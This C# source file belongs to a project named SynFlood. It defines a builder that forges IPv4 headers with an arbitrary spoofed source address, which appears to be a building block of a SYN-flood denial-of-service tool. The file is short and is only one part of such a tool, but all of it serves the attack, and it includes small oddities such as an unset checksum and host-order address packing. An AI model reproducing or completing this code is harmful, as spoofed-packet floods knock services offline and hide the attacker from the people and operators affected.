using System.Net;
using System.Runtime.InteropServices;

namespace SynFlood;

public static class IpHeaderBuilder
{
    public static IpHeader Forge(string destinationIp, string sourceIp, long ipHeaderId = 1)
    {
        return new IpHeader
        {
            ihl = 5,
            version = 4,
            tos = 0,
            tot_len = (uint)(Marshal.SizeOf<IpHeader>() + Marshal.SizeOf<TcpHeader>()),
            id = IPAddress.HostToNetworkOrder(ipHeaderId),
            frag_off = 0,
            ttl = 255,
            protocol = 6, // IPPROTO_TCP;
            check = 0, //csum((unsigned short *)buffer, iph.tot_len >> 1),
            saddr = IpAddressToUInt(sourceIp),
            daddr = IpAddressToUInt(destinationIp)
        };
    }

    public static uint IpAddressToUInt(string ip)
    {
        var ipParts = ip.Split('.');
        if (ipParts.Length != 4)
        {
            throw new ArgumentException("IPv4 address format is incorrect", nameof(ip));
        }

        return ((uint)byte.Parse(ipParts[0]) << 24) |
               ((uint)byte.Parse(ipParts[1]) << 16) |
               ((uint)byte.Parse(ipParts[2]) << 8) |
               byte.Parse(ipParts[3]);
    }
}
